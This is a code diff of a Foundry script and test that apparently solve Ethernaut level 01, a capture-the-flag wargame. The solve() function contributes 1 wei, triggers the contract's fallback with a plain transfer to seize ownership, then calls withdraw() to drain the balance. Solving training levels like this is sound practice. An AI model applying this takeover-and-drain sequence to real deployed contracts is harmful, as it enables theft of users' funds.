@@ -19,26 +19,31 @@ contract Ethernaut01 is EthernautTest {
     }
 
     function run() public {
-        vm.startBroadcast();
+        setUp();
         deploy();
-        solve(me);
+        solve();
         submit(me);
-        vm.stopBroadcast();
     }
 
-    function test_01_fallback() public {
-        vm.startPrank(me);
+    function test() public {
+        testMode = true;
         deploy();
-        solve(me);
+        solve();
         submit(me);
-        vm.stopPrank();
     }
 
-    function solve(address sender) internal {
+    function solve() internal {
+        broadcastOrPrank();
         IFallback(instance).contribute{value: 1}();
+
+        broadcastOrPrank();
         instance.call{value: 1}("");
+
+        broadcastOrPrank();
         IFallback(instance).withdraw();
 
         require(instance.balance == 0);
     }
+
+    fallback() external payable {}
 }
